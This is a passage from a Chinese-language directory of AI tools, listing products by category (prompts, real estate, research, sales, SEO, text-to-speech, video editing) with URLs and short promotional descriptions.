和机器学习来简化这些任务，帮助您简化创意过程、做出明智的决策并进行针对性营销以获得更好的结果。 typly 生产力 https://typly.app 使用我们的键盘单击一下即可回复您的所有消息！Typly 会自动生成与对话上下文相匹配的句子。允许您通过单击来回答问题或继续话题。 Promptist 提示 https://huggingface.co Promptist 是 Stable Diffusion v1-4 的提示界面，可优化用户对模型首选提示的输入。Hugging Face Spaces 的在线演示正在使用 CPU，因此预计生成速度较慢。请使用 GPU 在本地加载模型以加快生成速度。 Public Prompts 提示 https://publicprompts.art 图像生成的高质量和开源提示集合 Img2prompt 提示 https://replicate.com 获取与图像匹配的近似文本提示。（针对深度学习文生图模型进行了优化（剪辑 ViT-L/14）） PromptBase 提示 https://promptbase.com 查找最佳提示，产生更好的结果，节省 API 成本，销售您自己的提示。DALL·E，GPT-3，Midjourney，深度学习文生图模型提示市场。 PromptBox 提示 https://promptbox.ai 在不同的 AI 工具中组织、编辑和保存您的 AI 提示。提供保存等功能以提示使用右键单击。 Jrnylist 提示 https://jrnylist.com 中途提示助手。- 浏览数十个分类为艺术与插图或资产与 UI 的提示 您也可以提交自己的提示。 PromptLayer 提示 https://promptlayer.com PromptLayer 是第一个允许您跟踪和管理 GPT 提示工程的平台。PromptLayer 充当您的代码和 OpenAI 的 python 库之间的中间件。PromptLayer 记录您所有的 OpenAI API 请求，允许您在 PromptLayer 仪表板中搜索和探索请求历史记录。 Eye for AI 提示 https://eyeforai.xyz 将您喜欢的提示保存为模板，并在将来使用它们快速生成图像。模板可用于上传的图像或文本提示。 Dallelist 提示 https://dallelist.com Dallelist 允许您使用图像和样式作为参考轻松生成提示。（关键字）他们也提供与 DallE 网站集成的 chrome 扩展。 InteriorAI 房地产 https://interiorai.com 使用人工智能获取室内设计理念，并为具有不同室内风格的房地产列表提供虚拟舞台室内设计。 GetFloorPlan 房地产 https://getfloorplan.com 将您的 2D 平面图转换为现代且设施齐全的 3D 布局，并使用 AI 进行 360 度虚拟游览，每天可容纳数千人。 Maket 房地产 https://maket.ai 我们的生成设计软件使建筑师、建筑商和开发人员能够立即快速生成数千个建筑计划。 CoolAIid 房地产 https://coolaiid.com 使用 AI 的室内设计理念。无论您是想要装饰还是只是需要一点灵感，我们都会使用 AI 产生独特的想法。 AI Room Planner 房地产 https://airoomplanner.com AI 室内设计。为您的房间获取数百种室内设计理念 - 免费且无限制。 Scholarcy 研究 https://scholarcy.com 通过阅读由 AI 提供支持的大型文章的摘要，节省数百小时。在几秒钟内提取关键事实、数据和参考资料。 Scispace 研究 https://typeset.io 您的 AI Copilot 可以解码任何研究论文。阅读和理解科学文献的最快方式。突出显示令人困惑的文本、数学和表格以获得简单的解释。提出后续问题并获得即时答案。一种无需指定关键字即可搜索和查找相关论文的新方法。 Galactica 研究 https://galactica.org Galactica 是一个接受过人类科学知识训练的人工智能。您可以将它用作一个新界面来访问和操作我们对宇宙的了解。 Elicit 研究 https://elicit.org Elicit 使用语言模型来帮助您自动化研究工作流程，例如部分文献综述。Elicit 可以在没有完美关键字匹配的情况下找到相关论文，针对您的问题总结论文的要点，并从论文中提取关键信息。Elicit 还可以帮助完成其他研究任务，例如头脑风暴、摘要和文本分类。 Adept 研究 https://adept.ai Adept 是一个 ML 研究和产品实验室，通过使人类和计算机能够创造性地协同工作来构建通用智能。 Podcast 研究 https://podcast.ai 人工智能生成的播客。上面有 2 个播客 - Lex Fridman 采访 Richard Feynman 和 Joe Rogan 采访 Steve Jobs。 Consensus 研究 https://consensus.app Consensus 是一个搜索引擎，它使用 AI 直接从科学研究中即时提取、汇总和提炼发现。 Socratic by Google 研究 https://socratic.org 在 Google 人工智能的帮助下，摆脱科学、数学、文学、社会研究等学术问题的困扰，并获得每个学科重要概念的直观解释。 ML news 资源 https://machine-learning.news 以日语汇总与 AI 和 ML 相关的新闻的网站。 FlowGPT 资源 https://flowgpt.com FlowGPT：分享、发现和了解最有用的 ChatGPT 提示，这些提示可帮助您简化任务并提高工作效率。 The AI Times 资源 https://aitimespage.com 了解 AI Times。订阅以将 AI Times 的问题从数字媒体直接发送到您的收件箱。 AI Art Apps Database 资源 https://aiartapps.com 面向设计师和提示工程师的 AI 艺术资源、工具和灵感。找到 AI 艺术所需的一切。 Infranodus 销售 https://infranodus.com 使用 AI 和网络思维产生想法和洞察力。InfraNodus 结合了文本分析、网络可视化和 GPT-3 AI 来帮助您研究一篇文章，增强您的阅读、写作和研究工作流程。从多个导入源获取任何文本的概要概览，揭示主要主题及其之间的关系，找出模式和差距，发现正确的问题以推进您的思考和研究。 Reply.io 销售 https://reply.io 使用 Reply 的 AI Sales Email Assistant 在几秒钟内大规模生成类似人类的销售电子邮件。在 GPT-3 语言预测模型的支持下，您的冷邮件和后续邮件将始终高度相关和个性化，从而提高您的打开率和回复率！ Regie 销售 https://regie.ai Regie 使用 AI 帮助销售、营销和成功团队更快地编写引人入胜的内容 Cresta 销售 https://cresta.com 自助服务、现场指导和电话后见解。AI 可以揭示专业知识，因此团队可以让每一次客户对话都有价值。 Omneky 销售 https://omneky.com Omneky - 全渠道创意编排 Outplayhq 销售 https://outplayhq.com Outplay 是一个一体化的多渠道销售参与平台，可帮助销售团队完成更多交易并显着增加收入。 Usetwain 销售 https://usetwain.com 世界一流的销售技巧触手可及。免费使用 Twain 查看您的销售宣传中缺少什么。 Industrial Data Labs 销售 https://industrialdatalabs.com 在 BOM 工作流程中嵌入 AI。内部销售团队花费无数小时手动将物料清单电子表格中的数据输入报价系统和 ERP。我们经过行业培训的 AI 可自动执行此手动流程，让您的销售团队可以将更多时间用于销售。 MarbleFlows 销售 https://app.marbleflows.com AI 生成的表格可转化更多潜在客户。 GETitOUT 销售 https://getitout.io GETitOUT 是一个 AI 角色和文本生成器。营销与人物角色一起使用效果更好。但是为每个项目和客户创建它们？不好玩，至少到现在为止。了解 GETitOUT 的 Persona Generator：从竞争对手那里提取角色。生成专业文本。然后将它们粘贴到您所有的网站、电子邮件和营销工具中。 Klaviyo SMS Assistant 销售 https://klaviyo.com 使用 Klaviyo 的新人工智能短信助手在几秒钟内编写短信活动 Smartwriter 销售 https://smartwriter.ai 使用 AI 创建高度个性化的冷电子邮件或 Linkedin 消息，将读者转化为客户。无需经验。寻找潜在客户，创建量身定制的个性化文案并进行销售。人工智能冷电子邮件 Lavender 销售 https://lavender.ai Lavender 是一套完整的工具，可帮助您在更短的时间内获得更多回复。使用 Email AI 编写更好的电子邮件、更快地实现个性化并指导您的团队。 Andi 搜索引擎 https://andisearch.com Andi 正在使用生成式 AI 寻找下一代。Andi 不仅提供链接，还为您提供答案 - 就像与聪明的朋友交谈一样。 One More AI 搜索引擎 https://onemoreai.com AI 生成的库存图片 查找人工智能生成的数千张图片。 AnyPod 搜索引擎 https://anypod.ai 为创作者打造的 AI 搜索引擎。轻松搜索您最喜欢的播客，例如“我的第一百万”。您还可以提交添加播客的表格。 Kailua Labs 搜索引擎 https://app.kailualabs.com 在您的应用程序中构建强大的多模式搜索。使用我们的 API，通过 AI 轻松搜索您的图像、视频、音频等。 Explore AI 搜索引擎 https://exploreai.vercel.app 由 AI 提供支持的语义搜索引擎。直接在数千个 YouTube 视频中搜索答案，免费、易于浏览且快速。 Looria 搜索引擎 https://looria.com Looria 会找到适合您的需求和预算的最佳产品。他们从最值得信赖的来源收集评论，过滤掉虚假评论，并总结调查结果，以便您做出更明智的购买决定。 ChatGPT Chrome Extension 搜索引擎 https://chrome.google.com 在 Google、Bing、DuckDuckGo 搜索结果旁边显示 ChatGPT 响应。它为您的查询提供了令人惊讶的详细解决方案 - 从编写舞会提案到修复代码。 Everypixel 搜索引擎 https://everypixel.com 由 AI 提供支持的搜索引擎，可为 50 个付费和免费图片网站编制索引，并允许用户在几秒钟内搜索庞大的图片数据库。您还可以按图像和各种搜索过滤器进行搜索，使您能够按颜色、方向和图像类型进行搜索。您还可以比较来自不同网站的图像价格并按作者搜索。 Steno 搜索引擎 https://steno.ai 您最喜爱的播客，完全转录 在您收听时发现、参考和阅读。 Krea 搜索引擎 https://krea.ai 探索数百万 AI 生成的图像并创建提示集合。具有稳定的扩散世代。 Dreamsands 搜索引擎 https://dreamsands.ai Dreamsands 是一个创意市场，您可以在其中许可、收集和分享您感兴趣的 AI 生成艺术图像。 Generated Photos 搜索引擎 https://generated.photos 使用完全由 AI 生成的照片增强您的创意作品。通过我们分类和标记的应用程序查找模型图像，或通过 API 集成图像。 NeevaAI 搜索引擎 https://neeva.com NeevaAI 提供真实、实时的 AI 搜索。它将 AI 的强大功能与搜索堆栈相结合，为您提供快速、准确和最新的结果。并且，它提供了信息的来源。 Context 搜索引擎 https://addcontext.xyz 你最喜欢的内容。转录和搜索。Context 是一个由 AI 驱动的搜索引擎，可以在大量音频和视频内容中找到您正在寻找的任何时刻。您可以搜索 Mr Beast 和 MKBHD 等创作者的内容。 Perplexity AI 搜索引擎 https://perplexity.ai Perplexity AI 是一个人工智能搜索引擎。这是一个受 OpenAI WebGPT 启发的演示，不是商业产品。他们使用大型语言模型（OpenAI API）和搜索引擎。还通过将自然语言转换为 SQL 代码来回答 Twitter 图形查询。 Algolia 搜索引擎 https://algolia.com 适合您业务的最佳搜索和发现平台 Algolia 为构建者提供搜索和推荐服务，以创造世界一流的数字体验。 You 搜索引擎 https://you.com 您可以控制的搜索引擎。 Rosebud 搜索引擎 https://rosebud.ai AI 生成的视觉效果我们让您轻松获得所需的准确视觉效果。 Nyx 搜索引擎 https://nyx.gallery 本网站上的图像是用人工智能生成的，因此“不真实”。你会看到的食物、动物、风景等等都不存在！ PromptHero 搜索引擎 https://prompthero.com 通过 DALL-E、Stable Diffusion、Midjourney 等 AI 模型搜索数以百万计的艺术图像...... Writesonic 搜索引擎优化 https://writesonic.com Writesonic 是一个人工智能作家，可以免费为博客、Facebook 广告、谷歌广告和 Shopify 创建对 SEO 友好的内容。我们的释义工具可让您立即改写整篇文章。 Mentioned 搜索引擎优化 https://mentioned.ai 自动驾驶的影响者外展和链接建设。我们扫描您的内容以识别您提到的人和公司，然后发送电子邮件活动让他们知道。 BlogNLP 搜索引擎优化 https://blognlp.com BlogNLP 是一款免费的 AI 博客写作工具，可帮助您打破作者的障碍，在短时间内创建原创内容。 CTRify 搜索引擎优化 https://ctrify.com 第一个 AI 驱动的 SEO 操作平台只需为我们的人工智能提供一个关键字即可创建在 Google 上排名的网站。得益于我们来自世界各地顶级移动运营商的住宅 IP 连接的数百万真实桌面和移动设备的有机流量，提升您的 SERP 排名、有机点击率、停留时间和 Pogo 粘性。 Jenni 搜索引擎优化 https://jenni.ai 你写，Jenni 完成 用最先进的 AI 写作助手增强你的写作。 Closers Copy 搜索引擎优化 https://closerscopy.com 通过 SEO 优化博客和不可抗拒的营销文案促进您的销售。利用世界上最强大的文案的秘密……让您的文案机器人将它们变为现实！ Kafkai 搜索引擎优化 https://kafkai.com Kafkai 是一种机器学习算法，可以从头开始写文章。面向营销人员和 SEO 的尖端技术。 Spinrewriter 搜索引擎优化 https://spinrewriter.com 需要独特的内容？观看如何在 45 秒内将一篇文章改写成 500 篇文章。借助 ENL 技术，Spin Rewriter 是 SEO 专家的完美工具，他们需要独特的、人性化的内容才能在 Google 上获得更高的排名。 Writer 搜索引擎优化 https://writer.com Discover Writer，适用于团队的 AI 写作平台。随处制作清晰、一致且符合品牌的内容。今天免费试用。 LongShot 搜索引擎优化 https://longShot.ai 使用人工智能创建人类和搜索引擎喜欢的博客。LongShot 是一款 AI 写作助手，可帮助您和您的团队创建有用的博客，并在 Google 上排名。 Word Spinner 搜索引擎优化 https://word-spinner.com 立即将任何文章或文本重写为 SEO 友好的独特内容。Word Spinner 可以让您的写作前所未有地闪耀，对于任何想要提高写作技巧的人来说，它都是一个不错的选择。 Neuronwriter 搜索引擎优化 https://neuronwriter.com 优化您的网站内容，让 Google 喜欢它。具有语义模型 (NLP)、Google SERP 分析和竞争数据的高级内容编辑器。NEURONwriter 帮助您在考虑用户意图的情况下规划和优化内容！ Topicmojo 搜索引擎优化 https://topicmojo.com Topic mojo 是一种用于内容研究的 AI 工具。获取可帮助您发展在线业务的分析功能。 Compar 搜索引擎优化 https://compar.ai AI 支持的内容分析。 Typli 搜索引擎优化 https://typli.ai 最直观的 AI 内容工具，结合了 AI 写作和 SEO 助手。 Eilla AI 搜索引擎优化 https://eilla.ai Eilla.AI 是一款人工智能助手，可为您的企业、博客、广告、电子邮件和逼真的图像或艺术生成高质量的内容。免费开始，无需信用卡！ Letterdrop 搜索引擎优化 https://letterdrop.com 创建的内容增加 32%，速度更快，麻烦更少。Letterdrop 简化并自动化您的内容操作。 Writey AI 搜索引擎优化 https://writey.ai 改变内容的创建方式。使用人工智能更快地创建内容。最先进的语言 AI 第一个真正的免费抄袭 AI，具有原创和研究内容，检查 Writey AI 的实际应用 AI-Writer 搜索引擎优化 https://ai-writer.com AI-Writer是最精准的内容生成平台。使用最先进的 AI 写作模型从标题生成文章。 Scalenut 搜索引擎优化 https://scalenut.com 制作以简单且可扩展的方式服务于您的业务目标的内容。引导工作流程仅需 5 分钟即可完成博客！ Wordhero 搜索引擎优化 https://wordhero.co 借助 WordHero 的 AI 技术，您可以在几秒钟内创建原创博客文章、社交媒体内容、电子邮件等。 growthbar 搜索引擎优化 https://growthbarseo.com 使用 AI 为博客文章、网站页面和文章编写完美的 SEO 友好内容。 Katteb 搜索引擎优化 https://katteb.com Katteb AI 可以快速轻松地为您的博客和在线商店创建内容。 Thundercontent 搜索引擎优化 https://thundercontent.com 使用 AI 生成内容。Thundercontent 使用人工智能帮助您以光速撰写关于任何主题的独特文章。扩展您的内容策略。克服作家的障碍。您还可以使用 Thundercontent 生成音频。 Moonbeam 搜索引擎优化 https://gomoonbeam.com Moonbeam 的 AI 将为您提供编写杀手级长篇内容所需的一切。在 10 分钟内将写作能力提高 2 倍。 Copymatic 搜索引擎优化 https://copymatic.ai 使用 AI 在几秒钟内生成内容和复制使用 AI 来增加您的流量并节省工作时间。自动编写独特、引人入胜且高质量的副本或内容：在几秒钟内从长篇博文或登陆页面到数字广告。 ArticleForge 搜索引擎优化 https://articleforge.com 从产品描述到整个博客文章，只需单击一下，Article Forge 就可以提供关于任何主题的独特的、SEO 优化的、高质量的内容。 BrameWork 搜索引擎优化 https://bramework.com 写博客文章的速度提高 5 倍。Bramework 是一款易于使用的 AI 作家，可帮助博主、自由职业者和代理机构在每篇博文中节省时间。 InstaSalesAI 社交媒体助手 https://instasalesai.com InstaSalesAI 是用于 Instagram 营销的人工智能工具的集合。您可以使用它来生成轮播内容或营销挂钩。 FeedHive 社交媒体助手 https://feedhive.com 使用 FeedHive 的人工智能平台大规模创建、安排、发布和轻松管理您的社交媒体内容。拖放计划、自动生成主题标签以及最活跃的时间安排和精湛的分析。 Predis 社交媒体助手 https://predis.ai Predis.AI 是一种人工智能驱动的内容生成器，可帮助在几秒钟内创建令人惊叹的社交媒体帖子。它提供多种功能，例如创意生成、参与度预测、内容推荐、主题标签推荐和创意建议。 Tweet Hunter 社交媒体助手 https://tweethunter.io 建立您的 Twitter 受众并从中获利。获得销售、增长和新网络。比你目前正在尝试的更快。 Contenda 社交媒体助手 https://contenda.co 一个统一的内容存储库，可以比代理机构更好更快地重新利用技术内容 Editby 社交媒体助手 https://editby.ai 您是否发现自己很难想出有趣的推文？开始使用 AI 像著名的 Twitter 帐户一样写作，这样您就不必再担心作家的瓶颈了。 Spatial 社交媒体助手 https://spatial.ai 使用实时社交媒体细分系统预测和影响客户行为。它根据人们的社交、移动和网络活动以及描述某个位置附近社交活动的类型和速度的地点对他们进行细分。 SocialBu 社交媒体助手 https://socialbu.com SocialBu 是提高社交媒体影响力和最大化结果的完美解决方案。发布、响应、分析和自动化 - 全部在 SocialBu 中完成。 TweetEmote 社交媒体助手 https://TweetEmote.com AI 驱动的推文助手，可帮助用户撰写富有表现力且引人入胜的推文。还可以通过编写提示和选择情绪来创建对您想要的任何推文的智能回复。 Repl AI 社交媒体助手 https://replai.so 使用 AI 创建有意义的 Twitter 回复的 Chrome 扩展。Replai.so 是与社区建立联系、在社交媒体上显得聪明、有趣、专业、显得更聪明并以 10 倍的努力增加您的受众的最简单方式。你可以在 chrome 网上商店找到它。 CrawlQ.ai 社交媒体助手 https://crawlq.ai 与您的观众一起创造“品牌之爱”。CrawlQ 提供具有全球影响力的高情感、高同理心、高投资回报率、以受众为中心的创意作品。 Graham AI 社交媒体助手 https://grahamai.co 像 AI 生成的天才技术影响者一样发推文。 AI Social Bio 社交媒体助手 https://aisocialbio.com 您的社交媒体简历，由人工智能创建。 SheetGod 电子表格 https://boloforms.com 使用简单的英语和 SheetGod 创建复杂的 Excel 公式。我们的 AI 驱动工具还允许您创建宏、正则表达式和基本任务，以及 Google Appscript 代码片段来自动执行您的日常手动工作。立即尝试并体验 SheetGod 的强大功能。 Goodlookup 电子表格 https://goodlookup.com Goodlookup 是电子表格用户的智能功能。它将 AI 语言模型的优势带给普通人。 Excel Formula Bot 电子表格 https://excelformulabot.com 在 AI 的帮助下，在几秒钟内将您的文本指令转换为 Excel 公式。停止浪费时间创建 Excel 公式。体验 Excel 和 Google 表格 AI 公式生成器的全部功能，在几秒钟内解决问题。 Sheet+ 电子表格 https://sheetplus.ai 从文本生成 Google 表格和 Excel 公式，将公式转换为简单的解释、调试公式等。 Sheet AI 电子表格 https://sheetai.app 适用于 Google 表格和 Excel（即将推出）跳过学习，直接开始工作。使用 AI 将您的文本指令快速转换为 Google 表格公式。（2-3 周后上线） AIHelperBot 数据库 https://aihelperbot.com 使用 AI 即时构建 SQL 查询。无需先验 SQL 知识即可构建 SQL 查询。加入 1000 多人的行列，开始提高您的 SQL 熟练程度和工作效率。还支持 MongoDB 等 NoSQL 数据库。 AI Data Sidekick 数据库 https://airops.com 使用我们强大的秘诀集，编写 SQL、文档等的速度提高 10 倍。‍个人和小团队免费。 Channel 数据库 https://usechannel.com 用英语（自然语言）提问并自动生成您需要的 SQL、答案和可视化。与团队成员协作快速创建仪表板，然后使用频道建议的问题进一步探索您的数据。 Ai2sql 数据库 https://ai2sql.io 使用 AI2sql，工程师和非工程师都可以在不了解 SQL 的情况下轻松编写高效、无错误的 SQL 查询。 Avanty 数据库 https://avanty.app 永远不要再浪费宝贵的数据分析师时间来编写无聊的 SQL 查询。Avanty 是一种基于 AI 的数据查询 + 商业智能工具，让每个人都能以更低的成本更快地从数据中获得洞察力。 Broadn 启动 https://broadn.io 跟随你的好奇心，开阔你的视野。 Paperade 启动 https://paperade.co Paperade 是第一个基于 AI 的工具，可以从超过 1 亿篇学术论文和研究中生成商业用例和公司创意。这就像拥有创业理念方面的博士学位。 Tome 启动 https://beta.tome.app 生成式叙事的未来就在这里。使用 Tome 的 AI 驱动的讲故事格式解锁您的最佳作品。 Rationale 启动 https://rationale.jina.ai Rationale 是一款帮助企业家和管理者做出艰难决定的应用程序。只需输入您的未决决定，他们的人工智能应用程序就会列出优缺点或生成 SWOT 分析来帮助您权衡您的选择 Namelix 启动 https://namelix.com Namelix 将使用人工智能生成一个简短的品牌企业名称。也非常适合发现新域名 😃 Finta 启动 https://trustfinta.com 只需一个工具即可完成所有工作，为您的筹款活动提供支持。Finta 是您的筹款副驾驶。端到端地自动化您的工作流程，这样您就可以重新开始发展您的业务。 Ideabuddy 启动 https://ideabuddy.com 将您的经营理念变为现实。多合一的商业规划软件，可帮助您将伟大的想法变成成功的企业。 Validator AI 启动 https://validatorai.com 任何想法的 AI 业务验证器。在 AI 的支持下，验证并接收有关任何创业想法的建设性反馈。它首先列出您在经营业务时可能遇到的潜在困难，然后给出关于您的经营理念的总体反馈。 Durable 启动 https://durable.co 在 30 秒内让您的业务在线。面向个人企业主的人工智能平台。生成一个网站，自动化您的营销，并管理您的财务。 Pitchgrade 启动 https://pitchgrade.com 在您的推销平台上获得即时反馈，因此筹款成为您最不关心的事情。 Namewizard.ai 启动 https://namewizard.ai Namewizard 允许您为您的想法/项目/启动想出一个 AI 生成的名称。您还可以根据生成的名称浏览可用域。 Subtxt 说故事的人 https://subtxt.app Subtxt 是唯一符合作者直觉的智能大纲，而不是违背直觉。 Fabled 说故事的人 https://fabled.ai 终极 AI 故事生成器。由您创作的故事，由 AI 提供支持。用一句话 fabled.AI 制作个人插图故事，并通过令人惊叹的图像进行丰富。免费试用！ Artflow ai 说故事的人 https://artflow.ai 毫不费力地将想法转化为动画故事，让创造力流动起来。Artflow.AI 可让您使用 AI 生成的资产创建您自己的、具有原始角色的独特动画故事。 Once Upon A Bot 说故事的人 https://onceuponabot.com 使用 AI 创作原创故事。告诉 OnceUponABot 您的故事创意，机器人将使用 AI 从头开始编写故事。 NovelAI 说故事的人 https://novelai.net GPT 驱动的 AI Storyteller。在 AI 的驱动下，构建独特的故事、激动人心的故事、诱人的浪漫故事，或者只是胡闹。什么都可以！！ StoriesForKids 说故事的人 https://storiesforkids.ai 一起阅读和创造。在手机上几秒钟内将现实生活中的情景变成有趣的故事和插图。 Neural Canvas 说故事的人 https://neuralcanvas.io Neural Canvas 是一种数字插图生成器服务，能够为您的漫画、博客文章、电子书、故事、收藏等生成独特的插图。使用它创建您自己的 AI 生成的漫画。 BedtimeStory AI 说故事的人 https://bedtimestory.ai 在几秒钟内创建个性化的即时睡前故事。生成一个关于您孩子的故事，包括一些家庭成员作为角色，并添加类型、故事风格、道德等等——使用人工智能生成。他们的开放图书馆有 5000 多个故事。探索社区创造的所有故事。您可以为故事点赞、将它们加入您的收藏夹、重新混合*它们、与朋友分享、阅读给您的孩子听。 Scene One 说故事的人 https://sceneone.app 最好的图书写作软件。使用我们直观的写作应用程序编写更多故事，花更少的时间学习复杂的功能。 StoryWizard 说故事的人 https://storywizard.ai 创造精彩的儿童故事 通过使用人工智能帮助您生成独特而美丽的儿童故事，这些故事具有生动的画面和有趣的情节。 Story Path 说故事的人 https://storypath.app 由 AI 提供支持的图书规划应用程序 计划您的故事或在几分钟内解决您的作家的瓶颈 对您的情节接下来的发展方向感到困惑，或者有一个需要充实的故事想法？仅通过简短描述，Story Path 就会为您的情节生成分支选项。展开并探索您最喜欢的路径，并根据您的喜好自定义细节。 What on earth? 说故事的人 https://whatonearth.xyz 一种学习新事物的有趣方式。仅需一个单词提示即可生成故事。 Summate 摘要器 https://summate.it 总结网络文章的实验性 AI 工具。该站点使用全文 RSS 进行文章提取，使用 OpenAI 进行文章摘要。 TLDR this 摘要器 https://tldrthis.com TLDR 可帮助您将任何一段文本概括为简洁、易于理解的内容。从信息过载中解脱出来。 Upword 摘要器 https://upword.ai 使用 Upword 轻松总结您的内容。将他们强大的 AI 工具与您自己的笔记相结合，以创建更快、更高效的摘要，您可以阅读或收听。 WordfixerBot 摘要器 https://wordfixerbot.com WordfixerBot 是释义器、语法检查器、文本摘要器和文本比较工具。 Genei 摘要器 https://genei.io 自动总结背景阅读并更快地生成博客、文章和报告。 Otter AI 摘要器 https://otter.ai 从会议中捕捉和分享见解。Otter 记录会议，实时做笔记，并生成自动摘要以与所有人共享并帮助您记住一切。 Bearly 摘要器 https://bearly.ai 对研究人员非常有用的 AI 工具 - 它可用于创建摘要、大纲或改写文章。 Summari 摘要器 https://summari.com 改善您网站上的阅读体验。使用我们世界一流的 AI 摘要技术将链接升级为简短、信息丰富的预览。 Summarize Tech 摘要器 https://summarize.tech 人工智能驱动的视频摘要。获取任何长 YouTube 视频的摘要，例如讲座、现场活动或政府会议。 ExplainThis 摘要器 https://explainthis.ai 一个 chrome 扩展，可以用通俗易懂的语言向您解释概念。AI 助手只需单击一下即可提供整个页面的摘要。当您没有太多时间或想要一个简洁的总和时，这很有用 GPT-Prompter 摘要器 https://gptprompter.com Chrome 扩展程序可以快速解释所选文本。 SummerEyes 摘要器 https://summereyes.ai 一键总结互联网上的任何文本。提高您的工作效率。在很短的时间内达到目的。 Wellsaidlabs 文字转语音 https://wellsaidlabs.com 美妙的声音触手可及，文字转语音令人着迷。降低成本并简化语音制作过程。 Replicastudios 文字转语音 https://replicastudios.com 为您的创意项目合成 AI 语音。使用 Replica Voice 创建自然而富有表现力的语音表演。 Ad Auris 文字转语音 https://play.ad-auris.com 随时随地收听文章！创建文章播放列表并在 Spotify、Apple Podcasts 和 Google Podcasts 上收听它们。 FakeYou 文字转语音 https://fakeyou.com 使用 FakeYou 将文本转换为语音，并用您喜欢的角色说话。还可以获取您自己的语音克隆，用于音乐、视频、twitch 奖励以及您想要的任何内容。 Listnr 文字转语音 https://listnr.tech AI 语音生成器具有 80 多种语言的 600 多种画外音，在几秒钟内从文本到语音，以 MP3 或 WAV 格式轻松导出您的声音。 Resemble 文字转语音 https://resemble.ai 具有语音克隆功能的 AI 语音生成器，用于文本到语音的转换。 Audioread 文字转语音 https://audioread.com 将您的阅读变成播客。在您的播客应用程序中收听任何文章、PDF、电子邮件等。 Whisper 文字转语音 https://github.com Whisper 是一种通用的语音识别模型。它在不同音频的大型数据集上进行训练，也是一个多任务模型，可以执行多语言语音识别以及语音翻译和语言识别。 Descript 文字转语音 https://descript.com 创建语音的文本到语音模型。尝试现场演示。 Symbl.ai 文字转语音 https://symbl.ai 集成实时语音转文本和上下文理解。由先进的深度学习模型提供支持。从非结构化对话数据启用实时字幕、跟踪用户意图、生成摘要等。 Murf AI 文字转语音 https://murf.ai 使用多功能 AI 语音生成器将文本转换为语音 将 Murf 逼真的 AI 声音用于播客、视频和所有专业演示 Play.ht 文字转语音 https://play.ht 人工智能驱动的文本到语音生成器。使用我们的在线 AI 语音生成器和最佳合成语音生成逼真的文本到语音 (TTS) 音频。立即将文本转换为听起来自然的语音并下载为 MP3 和 WAV 音频文件。 Apple Books 文字转语音 https://apple.com 由文本到语音 AI 讲述的有声读物现在可以通过 Apple 的 Books 获得。最初仅适用于浪漫小说和小说书籍，其中列出了两个可用的数字声音：麦迪逊和杰克逊。 Article.Audio 文字转语音 https://article.audio 懒得看文章？没问题，听听吧！将文章转换为音频 Convai 文字转语音 https://convai.com 易于使用的对话式 AI API，用于语音识别、语言理解和生成以及文本到语音转换。设计您的游戏和支持语音的应用程序。设计基于对话的角色和基于语音的游戏。 Speechify 文字转语音 https://speechify.com 让格温妮丝·帕特洛 (Gwyneth Paltrow) 和史努比狗狗 (Snoop Dogg) 等名人朗读您的文字。适用于 Chrome、iOS、Android 和 Mac 的文字转语音。 Eleven Labs 文字转语音 https://levenlabs.io 语音的未来。第一个以任何语音和任何语言生成长格式语音的平台。我们使用 AI 为寻求终极叙事质量的创作者和出版商带来最自然、最引人注目的声音。 Coqui 文字转语音 https://coqui.ai Coqui，言论自由。 Free Subtitles AI 转录员 https://freesubtitles.ai 使用这个免费的开源应用程序为电影生成字幕！ fireflies.ai 转录员 https://fireflies.ai 会议的 AI 助手 录制、转录和搜索语音对话。 Whisper Memos 转录员 https://whispermemos.com Whisper Memos 是一款应用程序，可以记录您的声音并在几分钟后向您发送一封包含转录内容的电子邮件。用它来记录快速的想法、提醒和每日日记条目。 Supertranslate 转录员 https://supertranslate.ai 一键添加准确的英文字幕到任何语言的视频。您可以上传 100 多种语言的视频，Supertranslate 会自动生成英文字幕。Supertranslate 由 OpenAI 的 Whisper 提供支持，它是世界上最准确的语音转文本系统。它对背景噪音、语言混合和口音都很稳健。 Type Studio 视频编辑 https://typestudio.co Type Studio 是一种基于文本的视频编辑器，可以自动将您的视频转录为文本。他们还有用于视频编辑、字幕、播客、重新调整用途和录制的快速工具。 Contentfries 视频编辑 https://contentfries.com 使用 ContentFries 获取数十个内容片段。以比以往更快的速度提前数周或数月创建上下文内容。他们还有一个字幕创建软件 - 120 多种语言和方言的自动字幕。 Topaz Video AI 视频编辑 https://topazlabs.com 无限制地访问世界领先的生产级神经网络，用于视频放大、去隔行、运动插值和抖动稳定——所有这些都针对您的本地工作站进行了优化。 Shuffll 视频编辑 https://shuffll.com Shuffll 是一个尖端的视频制作平台，它使用 AI 技术简化创作过程。我们的平台使企业能够轻松创建高质量、个性化的视频内容，所用时间仅为使用传统方法所需时间的一小部分。 Gling 视频编辑 https://gling.ai Gling 是一款专为视频内容创作者打造的 AI 工具。他们的 AI 将为您消除沉默和糟糕的镜头，因此您可以专注于您的 YouTube 视频。 Pictory 视频编辑 https://pictory.ai Pictory 是一种视频营销工具，可以从长格式内容自动创建简短、高度共享的品牌视频。将您的脚本和博客文章自动变成引人入胜的视频。 Runwayml 视频编辑 https://runwayml.com 探索高级视频编辑功能，让您的创作更上一层楼。 Unscreen.com 视频编辑 https://unscreen.com 删除视频背景，100% 自动且免费。使用 Unscreen，您可以在任何地方录制您的镜头，然后简单地摆脱背景。 Colourlab 视频编辑 https://colourlab.ai 好莱坞遇上人工智能。Colourlab AI 借助全新的突破性人工智能工具，通过自动进行颜色匹配和平衡，使颜色分级变得快速、简单和简单。 Papercup 视频编辑 https://papercup.com 发现更快、更实惠的自动配音，并利用您现有的视频内容走向全球。使用 AI 以英语、西班牙语、葡萄牙语和意大利语配音您的内容。它们被 BBC、Sky News 和 Insider 等公司使用。 Dubverse 视频编辑 https://dubverse.ai 最简单（也是最神奇）的视频配音方式。只需单击一个按钮，即可使您的内容支持多种语言，并覆盖更多人。 Vidyo.ai 视频编辑 https://vidyo.ai 立即将长视频制作成短视频。使用强大的 AI 从您现有的视频中创建短片 ✨ 节省 90% 的时间和精力。 Munch 视频编辑 https://getmunch.com 自动将长视频转换为社交媒体的数据驱动短片。Munch 通过收集 TikTok、IG、YT 和 FB 用户的最高兴趣并将其应用到您的 AI 生成的剪辑中来产生曝光率和参与度。 FILM 视频生成器 https://replicate.com 电影 - 大场景运动的帧插值。在两个现有图像（插值）之间生成帧以尝试创建动画。 Astria 视频生成器 https://astria.ai 量身定制的人工智能图像生成。开始创建您的独特图像。 Waymark 视频生成器 https://waymark.com Waymark 的 AI 